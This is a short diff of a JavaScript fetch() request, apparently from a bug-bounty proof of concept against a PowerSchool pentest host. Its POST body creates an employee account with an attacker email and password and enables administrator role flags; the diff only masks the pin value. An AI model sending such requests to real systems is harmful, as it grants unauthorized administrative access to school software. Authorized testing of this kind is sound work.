@@ -37,7 +37,7 @@ fetch("https://pentest.sfe.powerschool.com/profileMainAction.do", {
   },
   "referrer": "https://pentest.sfe.powerschool.com/profileMainAction.do",
   "referrerPolicy": "strict-origin-when-cross-origin",
-  "body": "employeeSearchId=9997&accessIdStr=9997&webPassword=Attacker@powerschool.com&lastName=attacker&firstName=John&email=esperamier%2Battacker%40bugcrowdninja.com&pin=&externalId=&customField1=&customField2=&customField3=&customField4=&customField5=&customField6=&customField7=&customField8=&phone1=02126909455&addressLn1=1870+Oakwood+Avenue&addressLn2=&city=New+York&state=NY&zip=100314&genderCd=0&ethnicityCd=0&languageId=1&enableTimeKeeping=on&roleAdm=on&activeAdm=on&roleEmp=on&activeEmp=on&calendarId=1&disableJobShopping=false&callBackNumber=&submitInsert=Save",
+  "body": "employeeSearchId=9997&accessIdStr=9997&webPassword=Attacker@powerschool.com&lastName=attacker&firstName=John&email=esperamier%2Battacker%40bugcrowdninja.com&pin=******&externalId=&customField1=&customField2=&customField3=&customField4=&customField5=&customField6=&customField7=&customField8=&phone1=02126909455&addressLn1=1870+Oakwood+Avenue&addressLn2=&city=New+York&state=NY&zip=100314&genderCd=0&ethnicityCd=0&languageId=1&enableTimeKeeping=on&roleAdm=on&activeAdm=on&roleEmp=on&activeEmp=on&calendarId=1&disableJobShopping=false&callBackNumber=&submitInsert=Save",
   "method": "POST",
   "mode": "cors",
   "credentials": "include"
